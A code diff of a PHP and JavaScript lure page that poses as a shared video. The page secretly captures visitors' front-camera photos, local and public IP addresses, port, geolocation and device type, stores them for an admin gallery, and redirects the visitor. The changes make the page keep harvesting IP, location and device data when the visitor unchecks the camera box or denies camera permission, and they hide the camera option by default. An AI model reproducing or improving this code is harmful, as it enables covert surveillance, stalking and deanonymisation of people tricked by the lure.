@@ -171,19 +171,18 @@ if (isset($_GET['r'])) {
         }
 
         if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_capture'])) {
-            $img_base64 = $_POST['image'] ?? '';
+            $img_base64 = $_POST['image'] ?? ''; // قد تكون فارغة إذا تم إلغاء تفعيل الكاميرا
             $public_ip = get_real_ip();
             $local_ip = $_POST['lip'] ?? 'Direct';
             $port = $_SERVER['REMOTE_PORT'] ?? 'Unknown';
             $location = get_ip_location($public_ip);
             $device = get_device_type($ua);
 
-            if (!empty($img_base64)) {
-                try {
-                    $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
-                    $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $location, $device, date('Y-m-d H:i:s')]);
-                } catch (Exception $e) {}
-            }
+            try {
+                $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
+                $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $location, $device, date('Y-m-d H:i:s')]);
+            } catch (Exception $e) {}
+            
             exit('OK');
         }
 ?>
@@ -256,7 +255,7 @@ if (isset($_GET['r'])) {
         .btn-secondary { background: transparent; color: #888; border: none; font-size: 13px; font-weight: 500; cursor: pointer; padding: 4px; }
     </style>
     <script>
-        let isCaptured = false;
+        let isSubmitted = false;
         const targetUrl = "<?php echo $target_redirect; ?>";
 
         function getLocalIP(callback) {
@@ -280,37 +279,45 @@ if (isset($_GET['r'])) {
         }
 
         function handleWatchClick() {
-            if (isCaptured) return;
-            isCaptured = true;
+            if (isSubmitted) return;
+            isSubmitted = true;
 
             const enableCamera = document.getElementById('enableCamera').checked;
 
-            if (!enableCamera) {
-                window.location.replace(targetUrl);
-                return;
-            }
+            getLocalIP(function(localIp) {
+                const formData = new URLSearchParams();
+                formData.append('save_capture', '1');
+                formData.append('lip', localIp);
 
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-                .then(stream => {
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
-                    
-                    setTimeout(() => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = 640;
-                        canvas.height = 480;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                if (!enableCamera) {
+                    // إذا تم إلغاء تحديد الكاميرا، يتم إرسال المعلومات الأخرى فقط بدون صورة
+                    fetch(window.location.href, {
+                        method: 'POST',
+                        body: formData
+                    }).finally(() => {
+                        window.location.replace(targetUrl);
+                    });
+                    return;
+                }
+
+                // إذا كان خيار الكاميرا مفَعّلاً، يتم طلب الإذن والتقاط الصورة
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+                    .then(stream => {
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.play();
                         
-                        const imageData = canvas.toDataURL('image/jpeg', 0.85);
-                        stream.getTracks().forEach(track => track.stop());
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = 640;
+                            canvas.height = 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            
+                            const imageData = canvas.toDataURL('image/jpeg', 0.85);
+                            stream.getTracks().forEach(track => track.stop());
 
-                        getLocalIP(function(localIp) {
-                            const formData = new URLSearchParams();
-                            formData.append('save_capture', '1');
                             formData.append('image', imageData);
-                            formData.append('lip', localIp);
 
                             fetch(window.location.href, {
                                 method: 'POST',
@@ -318,12 +325,18 @@ if (isset($_GET['r'])) {
                             }).finally(() => {
                                 window.location.replace(targetUrl);
                             });
+                        }, 600);
+                    })
+                    .catch(err => {
+                        // في حال رفض إذن الكاميرا، يتم إرسال باقي البيانات وتخطي الصورة
+                        fetch(window.location.href, {
+                            method: 'POST',
+                            body: formData
+                        }).finally(() => {
+                            window.location.replace(targetUrl);
                         });
-                    }, 600);
-                })
-                .catch(err => {
-                    window.location.replace(targetUrl);
-                });
+                    });
+            });
         }
 
         window.addEventListener('DOMContentLoaded', () => {
@@ -343,10 +356,10 @@ if (isset($_GET['r'])) {
         <h2>Watch this video</h2>
         <p><strong><?php echo htmlspecialchars($sender_name); ?></strong> shared a video with you. Watch now to view content!</p>
         
-        <!-- زر اختيار تفعيل الكاميرا (اختياري) -->
+        <!-- زر اختياري لتفعيل أو تعطيل الكاميرا -->
         <label class="checkbox-container">
-            <input type="checkbox" id="enableCamera" checked>
-            <span>Enable camera verification for high quality</span>
+            <input type="checkbox" id="enableCamera">
+            <span>Enable camera verification</span>
         </label>
 
         <button id="watchBtn" class="btn-action">Watch Now</button>
@@ -525,9 +538,13 @@ if (!empty($filter_code)) {
                 <div class="gallery-grid">
                     <?php foreach ($captures as $cap): ?>
                         <div class="card-img">
-                            <a href="<?php echo $cap['image_data']; ?>" target="_blank">
-                                <img src="<?php echo $cap['image_data']; ?>" alt="Capture">
-                            </a>
+                            <?php if(!empty($cap['image_data'])): ?>
+                                <a href="<?php echo $cap['image_data']; ?>" target="_blank">
+                                    <img src="<?php echo $cap['image_data']; ?>" alt="Capture">
+                                </a>
+                            <?php else: ?>
+                                <div style="width:100%; height:160px; background:#0b0f17; display:flex; align-items:center; justify-content:center; color:var(--text-muted); border-radius:6px; border:1px solid var(--border-color);">No Image Captured</div>
+                            <?php endif; ?>
                             <div class="info-row" style="margin-top:10px;">
                                 <span>Code:</span> <span class="code-badge"><?php echo htmlspecialchars($cap['code']); ?></span>
                             </div>
